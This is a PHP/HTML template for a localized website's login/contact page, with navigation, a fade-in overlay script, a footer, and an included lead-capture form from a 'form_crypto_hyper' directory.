<?php
require_once rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/assets/php/bootstrap.php';


$pageSlug = detectPageSlug(__FILE__);
?>
<!DOCTYPE html>
<html lang="<?php echo getLang('locale_lang') ?>" class="html">
  <head>
    <?php generateMetaTags($pageSlug); ?>
    <?php generateHreflangTags(); ?>
    <?php generateJsonLd($pageSlug); ?>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, shrink-to-fit=no"
    />

    <link rel="icon" href="/assets/images/favicon.ico" sizes="32x32" />
    <link rel="icon" href="/assets/images/icon.svg" type="image/svg+xml" />
    <link rel="apple-touch-icon" href="/assets/images/icon-180.png" />

    <link href="/assets/css/global-4NUCUX4u.css" rel="stylesheet" />
  </head>

  <body style="position: relative" class="body contact">
    <span
      id="v2-overlay"
      style="
        position: absolute;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        background-color: rgb(3, 7, 18);
        z-index: 999;
        transition: opacity 700ms;
        pointer-events: none;
      "
    ></span>
    <script>
      (function () {
        const overlay = document.getElementById("v2-overlay");
        overlay.style.opacity = "1";

        setTimeout(() => {
          overlay.style.opacity = "0";
        }, 500);

        setTimeout(() => {
          overlay.remove();
        }, 2000);
      })();
    </script>

    <div class="page js-page">
      <picture>
        <img
          src="/assets/images/page-bg-lg.webp"
          fetchpriority="high"
          alt="bg"
          class="absolute top-0 left-0 right-0 -z-1 w-full h-auto"
          width="750"
          height="434"
        />
      </picture>

      <header
        id="header"
        class="fixed top-0 left-0 w-full transition duration-500 text-white z-50"
      >
        <nav
          class="sw-container flex items-center justify-between h-14 sm:h-19"
          aria-label="Main navigation"
        >
          <ul class="flex items-center w-full gap-8 font-medium">
            <li class="mr-12">
              <a
                href="<?php echo getHref('') ?>"
                class="flex items-center min-w-36"
                aria-label="Main page"
              >
                <span style="font-weight: bold; font-size: 1.8rem"
                  ><?php echo getLang('logo_name'); ?></span
                >
              </a>
            </li>

            <li class="hidden lg:block">
              <a
                href="<?php echo getHref('') ?>"
                class="hover:text-gray-300 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-indigo-300"
                ><?php echo getLang('menu_home'); ?></a
              >
            </li>
            <li class="hidden lg:block">
              <a
                href="<?php echo getHref('about') ?>"
                class="hover:text-gray-300 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-indigo-300"
                ><?php echo getLang('menu_about'); ?></a
              >
            </li>
            <li class="hidden lg:block">
              <a
                href="<?php echo getHref('login') ?>"
                class="hover:text-gray-300 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-indigo-300"
                ><?php echo getLang('menu_contact'); ?></a
              >
            </li>

            <li class="hidden lg:block ml-auto">
              <a
                href="<?php echo getHref('login') ?>"
                class="block ml-4 px-5 py-3 text-sm rounded-lg border border-white/15 bg-white/10 hover:bg-white/20 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-indigo-300"
              >
                <?php echo getLang('menu_login'); ?>
              </a>
            </li>
          </ul>

          <button
            id="header-menu-btn"
            type="button"
            class="lg:hidden inline-flex items-center justify-center p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-600 transition-all duration-300"
            aria-controls="mobile-menu"
            aria-expanded="false"
            aria-label="Open mobile menu"
          >
            <svg
              id="burger-icon"
              class="h-6 w-6 transition-all duration-300"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              viewBox="0 0 24 24"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M4 6h16M4 12h16M4 18h16"
              ></path>
            </svg>
            <svg
              id="close-icon"
              class="h-6 w-6 transition-all duration-300 opacity-0 absolute"
              fill="none"
              stroke="currentColor"
              stroke-width="2"
              viewBox="0 0 24 24"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M6 18L18 6M6 6l12 12"
              ></path>
            </svg>
          </button>
        </nav>
      </header>

      <div
        id="header-mobile-menu"
        class="mob-menu-bg fixed left-1/2 transform -translate-x-1/2 w-[calc(100vw-8px)] bg-gradient-to-b from-blue-900 to-purple-900 rounded-2xl shadow-2xl opacity-0 invisible scale-95 transition-all duration-300 ease-in-out lg:hidden z-50 overflow-hidden"
        aria-label="Mobile menu"
      >
        <div
          class="px-3 pt-12 pb-12 overflow-y-auto scrollbar-thin scrollbar-thumb-white/20 scrollbar-track-transparent"
        >
          <ul class="flex flex-col items-center gap-6">
            <li>
              <a
                href="<?php echo getHref('') ?>"
                class="block text-white text-xl font-medium hover:text-gray-300 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white/50 py-2 px-4"
                ><?php echo getLang('menu_home'); ?></a
              >
            </li>
            <li>
              <a
                href="<?php echo getHref('about') ?>"
                class="block text-white text-xl font-medium hover:text-gray-300 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white/50 py-2 px-4"
                ><?php echo getLang('menu_about'); ?></a
              >
            </li>
            <li>
              <a
                href="<?php echo getHref('login') ?>"
                class="block text-white text-xl font-medium hover:text-gray-300 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white/50 py-2 px-4"
                ><?php echo getLang('menu_contact'); ?></a
              >
            </li>

            <li class="w-full">
              <a
                href="<?php echo getHref('login') ?>"
                class="block w-full px-5 py-3 rounded-lg border border-white/20 bg-white/10 hover:bg-white/20 text-white text-center font-medium focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-white/50"
              >
                <?php echo getLang('menu_login'); ?>
              </a>
            </li>
          </ul>
        </div>
      </div>
      <link rel="stylesheet" href="/assets/css/header.css" />

      <main>
        <section class="sw-container mt-12 lg:mt-6">
          <div class="lg:grid lg:grid-cols-2">
            <div class="mb-8 md:mb-0 lg:pr-48">
              <div class="lg:mb-40 pb-6 lg:pb-0">
                <a
                  href="<?php echo getHref('') ?>"
                  class="inline-flex gap-3 items-center text-slate-400 hover:text-white text-sm font-medium py-2"
                >
                  <img
                    src="/assets/images/arrow-left--gray.svg"
                    aria-hidden="true"
                    width="20"
                    height="20"
                    loading="lazy"
                  />
                  <span><?php echo getLang('back_to_home'); ?></span>
                </a>
              </div>

              <h1
                class="text-5xl lg:text-7xl font-medium leading-tight text-white mb-6"
              >
                <?php echo getLang('login__title') ?>
              </h1>
              <p class="mb-16 text-lg lg:text-xl text-white/70">
                <?php echo getLang('login__text') ?>
              </p>
            </div>

            <div
              class="p-2 border-[#FFFFFF1F] border rounded-2xl backdrop-blur-2xl bg-[#FFFFFF14] mb-18 lg:mb-0"
            >
              <div class="bg-white py-8 lg:py-12 px-4 lg:px-10 rounded-xl">
                <?php
                        $country = $clientCountryCode;
                        $phonecode = $clientCountryCode;
                        $submit = '';
                        $language = getLang('language_iso');
                        $offer = getLang('brand_name_api');
                        include rtrim($_SERVER['DOCUMENT_ROOT'], '/') . "/form_crypto_hyper/form_js_thanks.php"; ?>
              </div>
            </div>
          </div>
        </section>
      </main>
    </div>

    <footer class="text-white">
      <div class="sw-container py-10 md:py-16">
        <nav class="grid grid-cols-1 md:grid-cols-2 gap-8 mb-8 md:mb-14">
          <div class="flex gap-8 md:gap-30">
            <ul class="space-y-4 text-sm">
              <li>
                <a
                  href="<?php echo getHref('privacy') ?>"
                  class="block hover:text-white/50"
                  ><?php echo getLang('menu_privacy'); ?></a
                >
              </li>

              <li>
                <a
                  href="<?php echo getHref('terms') ?>"
                  class="block hover:text-white/50"
                  ><?php echo getLang('menu_terms'); ?></a
                >
              </li>
            </ul>

            <div class="space-y-4">
              <a
                href="<?php echo getHref('') ?>"
                class="block text-white hover:text-white/50 text-sm"
                ><?php echo getLang('menu_home'); ?></a
              >
              <a
                href="<?php echo getHref('about') ?>"
                class="block text-white hover:text-white/50 text-sm"
                ><?php echo getLang('menu_about'); ?></a
              >
              <a
                href="<?php echo getHref('login') ?>"
                class="block text-white hover:text-white/50 text-sm"
                ><?php echo getLang('menu_contact'); ?></a
              >
            </div>
          </div>

          <div class="md:justify-self-end">
            <h3 class="text-white/50 font-medium mb-5">
              <?php echo getLang('footer__nav_title'); ?>
            </h3>
            <div class="lang-select menu-call" data-open="false">
              <?php generateLanguageSelector() ?>
            </div>
          </div>
        </nav>

        <div class="pt-6">
          <span style="font-weight: bold; font-size: 2.7rem" class="mb-6"
            ><?php echo getLang('logo_name'); ?></span
          >
          <address
            class="text-sm text-slate-400/80 max-w-4xl mb-8 md:mb-14 leading-normal not-italic"
          >
            <?php echo getLang('footer__text'); ?>
          </address>

          <p class="text-sm text-slate-400/80">
            <?php echo getLang('footer__copy'); ?>
          </p>
        </div>
      </div>
    </footer>

    <script src="/assets/js/header-rw4LHZmG.js" type="module"></script>
    <script src="/assets/js/lang.js"></script>
  </body>
</html>
